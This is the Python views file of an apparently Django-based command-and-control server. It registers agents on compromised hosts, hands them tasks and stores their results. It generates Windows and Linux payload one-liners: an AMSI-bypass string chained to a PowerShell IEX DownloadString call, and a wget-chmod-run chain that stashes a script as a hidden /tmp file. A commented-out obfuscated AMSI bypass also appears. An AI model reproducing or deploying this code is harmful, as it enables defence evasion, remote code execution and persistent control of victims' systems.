import base64
from django.conf import settings
from django.contrib.auth.decorators import login_required
from django.shortcuts import render 
from .forms import *
from .models import *
import netifaces
import os
import random
import string
from django.http import HttpResponse , JsonResponse
from django.views import View
from flask import Flask
import threading
import sys
from multiprocessing import Process
from django.contrib.auth.models import User
from django.http import HttpResponseRedirect 
from .forms import UploadFileForm
from rest_framework.response import Response
from rest_framework import status
from rest_framework.views import APIView
from .serializers import *
from datetime import datetime

current_path= os.path.dirname(os.path.abspath(__file__))

listen_path = os.path.dirname(os.path.abspath(__file__))+"/data/listeners/"
app         = Flask(__name__)
port = 8000


def get_client_ip(request):
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip


#Agent Registeration by sending POST-Req with hostname & username after executing the payload on the Target
def registerAgent(request):
    if request.method=='POST':
        hostname = request.POST['hname']
        username = request.POST['username']
        remoteip = (get_client_ip(request))
        eth = request.POST['eth']
        if Agent.objects.filter(hname = hostname).filter(username=username).exists():
            data = Agent.objects.filter(hname = hostname).filter(username = username).values()[0]
            agentname = data['name']
            oldusername = data['username']
            if data['ip'] != remoteip:
                s=Agent.objects.filter(hname = hostname).get(username=username)
                s.ip = remoteip
                s.save()
        else:
            agentname     = ''.join(random.choice(string.ascii_uppercase) for i in range(6)) #ASFASA
            s=Agent(name=agentname, ip = remoteip, hname= hostname, username= username )
            s.save() 
        
        Listener.agent(agentname,remoteip, eth)
        request.session['agentName'] = agentname
        response = HttpResponse(agentname)
        response.set_cookie('agentName' , agentname)
        return response
    else:
        return ('',204)

    
class Listener():
    class PostListener(View):
        def post(self,request):    
            eth = request.POST['listener']
            listneres = ListenerForm.objects.all()
            if not listneres:
                listnerForm = ListenerForm()
                listnerForm.interface = eth
                listnerForm.created_date= datetime.now()
                listnerForm.save()
                return JsonResponse({'data': True},status=200)
            else:
                for listener in listneres:
                    if listener.interface == eth:
                        oListener = ListenerForm.objects.get(interface = eth)
                        oListener.created_date = datetime.now()
                        oListener.save()
                        return JsonResponse({'data': True},status=200)
                    else:       
                        listnerForm = ListenerForm()
                        listnerForm.interface = eth
                        listnerForm.created_date= datetime.now()
                        listnerForm.save()
                        return JsonResponse({'data': True},status=200)

        def get(self,request):
            listeners = ListenerForm.objects.order_by("-created_date").all()
            return render(request, 'blog/listeners.html' , {"listeners" : listeners})

    class payloadGen(View):
        def post(self,request):
            eth = request.POST['listener']      
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            output_path= "/tmp/{}".format(eth)
            with open(os.path.dirname(os.path.abspath(__file__))+"/powershell.ps1","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            with open(output_path,"wt") as R:
                R.write(payload)

            with open(listen_path+"/{}".format(eth),"wt") as R:
                R.write(payload)

            listener = ListenerForm.objects.get(interface= eth)
            if listener:
                listener.ip = ip
                listener.save()
            amsi= '$apple=[Ref].Assembly.GetTypes();ForEach($banana in $apple) {if ($banana.Name -like "*siUtils") {$cherry=$banana}};$dogwater=$cherry.GetFields(\'NonPublic,Static\');ForEach($earache in $dogwater) {if ($earache.Name -like "*InitFailed") {$foxhole=$earache}};$foxhole.SetValue($null,$true);'
            oneliner = "{} IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/sc/{}\')".format(amsi,ip, str(port), eth)
            return JsonResponse({"payload" : oneliner} , status=200)

#powershell.exe -nop -w hidden -c 

        def get(self,request):
            return render(request,'blog/payload-Gen.html')



    class lin_payloadGen(View):
        def post(self,request):
            eth = request.POST['listener']
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            output_path= "/tmp/{}".format(eth)
            with open(os.path.dirname(os.path.abspath(__file__))+"/bash","rt") as p:
                payload = p.read()
            payload = payload.replace('REPLACE_IP',ip)
            payload = payload.replace('REPLACE_PORT',str(port))
            payload = payload.replace('REPLACE_INTERFACE',eth)
            with open(output_path,"wt") as R:
                R.write(payload)

            with open(listen_path+"/{}".format(eth),"wt") as R:
                R.write(payload)
                
            listener = ListenerForm.objects.get(interface= eth)
            if listener:
                listener.ip = ip
                listener.save()    
                
            oneliner = "wget --no-check-certificate https://{}:{}/download/{} -O /tmp/.bash-profile;chmod +x /tmp/.bash-profile;bash /tmp/.bash-profile".format(ip, str(port), eth)
            return JsonResponse({"payload" : oneliner} , status=200)
            #return render(request,'blog/lin_payload-Gen.html', {'payloadline':oneliner})

        def get(self,request):
            return render(request,'blog/lin_payload-Gen.html')

    class agent():   
        
        def __init__(self, name, remote , eth):

            self.name      = name
            self.remote  = remote
            self.eth = eth
            self.sleept    = 3
            self.Path      = listen_path+"agents/{}/".format(self.name)
            self.tasksPath = "{}tasks".format(self.Path, self.name)
            netifaces.ifaddresses(eth)
            self.eth_ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            
            if os.path.exists(self.Path) == False:
                os.mkdir(self.Path)
                
        # def run(eth_ip,port):      ######multi threading with django or flask
        #     app.logger.disabled = True
        #     app.run(port=port, host=eth_ip)
            
        # def start(self):
        #     server = Process(target=Listener.agent.run(self.eth_ip,port))  
        #     cli = sys.modules['flask.cli']
        #     cli.show_server_banner = lambda *x: None
        #     daemon = threading.Thread(name = self.name,
        #                                     target = server.start,
        #                                     args= ())
        #     daemon.daemon = True
        #     daemon.start()
        #     try:
        #         Listener.agent.start(self)
        #         print("Listener started.")
        #     except:
        #         print("Failed. Check your options.")
                
# Create Download link to redirect to sendFile funtion
        def sendScript(request , eth=''):
            netifaces.ifaddresses(eth)
            ip= netifaces.ifaddresses(eth)[netifaces.AF_INET][0]['addr']
            # amsi     = "sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE](\"{1}{0}\"-F'F','rE' ) ) ; ( GeT-VariaBle ( \"1Q2U\" +\"zX\" ) -VaL).\"A`ss`Embly\".\"GET`TY`Pe\"(( \"{6}{3}{1}{4}{2}{0}{5}\" -f'Util','A','Amsi','.Management.','utomation.','s','System' )).\"g`etf`iElD\"( ( \"{0}{2}{1}\" -f'amsi','d','InitFaile' ),(\"{2}{4}{0}{1}{3}\" -f 'Stat','i','NonPubli','c','c,' )).\"sE`T`VaLUE\"(${n`ULl},${t`RuE} ); "
            oneliner = "IEX(New-Object Net.WebClient).DownloadString(\'https://{}:{}/download/{}\')".format(ip,str(port),eth)
            return HttpResponse(oneliner)

# execute payload content to get the connection to our server
        def sendFile(request, eth=''):
            output_path= "/tmp/{}".format(eth)
            f    = open("{}".format(output_path), "rt")
            data = f.read()
            f.close()
            return HttpResponse(data)

# read tasks then remove tasks file
        def serveTasks(request,name=''):
            tasksPath = listen_path+"agents/{}/tasks".format(name)
            if os.path.exists(tasksPath):
                with open(tasksPath, "r") as f:
                    task = f.read()
                    
                os.remove(tasksPath)    
                return HttpResponse(task)
            else:
                return HttpResponse('')

        #Receive results from the Agent then put it in result file
        def receiveResults(request,name=''):
            resultspath = listen_path+"agents/{}/results".format(name)
            if os.path.exists(resultspath) == False :
                f= open(resultspath,"w+")
            if request.method == 'POST':
                result = request.POST['result']
                agent_Tasks = AgentTasks.objects.order_by("-created_date")[0]
                agent_Tasks.task_result = result
                agent_Tasks.save()
                with open(resultspath,'a') as r:
                    r.write(result) 
                    r.close()
                return HttpResponse('')
            else:
                return HttpResponse('')

        def LinreceiveResults(request,name=''):
            resultspath = listen_path+"agents/{}/results".format(name)
            if os.path.exists(resultspath) == False :
                f= open(resultspath,"w+")
            if request.method == 'POST':
                result = request.body.decode()
                base64_bytes = result.encode('ascii')
                message_bytes = base64.b64decode(base64_bytes)
                result = message_bytes.decode('ascii')
                with open(resultspath,'a') as r:
                    r.write(result) 
                    r.close()
                return HttpResponse('')
            else:
                return HttpResponse('')



#Imaginary function to handle an uploaded file. ########################                                           
def handle_uploaded_file(f):
    with open('uploaded', 'wb+') as destination:
        for chunk in f.chunks():
            destination.write(chunk)


def upload_file(request):
    if request.method == 'POST':
        form = UploadFileForm(request.POST, request.FILES)
        if form.is_valid():
            handle_uploaded_file(request.FILES['file'])
            return HttpResponseRedirect('../homePage')
    else:
        form = UploadFileForm()
    return render(request, 'blog/upload.html', {'form': form})

#########################################################################

def LoginPage(request):
    return render(request  , 'blog/login.html' )

@login_required
def HomePage(request):
    listeners = ListenerForm.objects.all()
    agents = Agent.objects.all()
    #request.session['test'] = "Helo"
    response = render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners) , "agents" : list(agents) } )
    #response.set_cookie( 'test' , 'hello' )
    return response
    #return render(request  , 'blog/HomePage.html' , {'listeners' : list(listeners)} )

@login_required
def AgentPage(request):
    agents = Agent.objects.all()
    return render(request  , 'blog/agents.html' , {"agents" : list(agents)} )

@login_required
def Tasks(request , name):
    oAgent = Agent.objects.get(name = name)
    return render(request  , 'blog/tasks.html' , {"agentName": name , "agentId": oAgent.pk,   "currentPath" : current_path})

@login_required
def AgentTask(request , id):
    oAgentTask = AgentTasks.objects.get(pk = id)
    return render(request  , 'blog/agentTask.html' , {"oAgentTask": oAgentTask })

class GetAgentsTasks(APIView):
    def get(self , request , name):
        queryset = AgentTasks.objects.select_related('module').select_related('agent').select_related('user').filter(agent__name = name).order_by('-created_date').all()
        serializer = AgentTaskSerializer(queryset, many=True, context={'request': request})
        return Response(serializer.data)




    
class GetFileResult(APIView):
    def get(self , request , name):
        f = open("{}".format(current_path+"/data/listeners/agents/"+ name + "/results"), "rt")
        strFile = ''
        for lines in f.readlines():
            #strFile+="<pre class='my-0 py-0'>" + lines + "</pre>"
            strFile += lines
        task = f.read()
        f.close()   
        return HttpResponse(strFile ,  content_type="text/plain")

class TasksApi(APIView):
    def get(self , request , type):
        if type == 0:
            queryset = Modules.objects.all()   
        elif type == 1:
              queryset = Modules.objects.filter(module_type=1) 
        elif type == 2:
              queryset = Modules.objects.filter(module_type=2)
        elif type == 3:
              queryset = Modules.objects.filter(module_type=3)
        elif type == 4:
              queryset = Modules.objects.filter(module_type=4)
        else:
             queryset = Modules.objects.filter(module_type=5)
             
        serializer = ModuleSerializer(queryset, many=True, context={'request': request})
        return Response(serializer.data)


@login_required
def ListenersPage(request):
    return render(request  , 'blog/listeners.html' )



@login_required
def HackerUser(request):
    Users  = User.objects.all()
    return render(request  , 'blog/creatuser.html' , {'users' : list(Users) } )


@login_required
def Launcher(request):
    return render(request  , 'blog/launcher.html')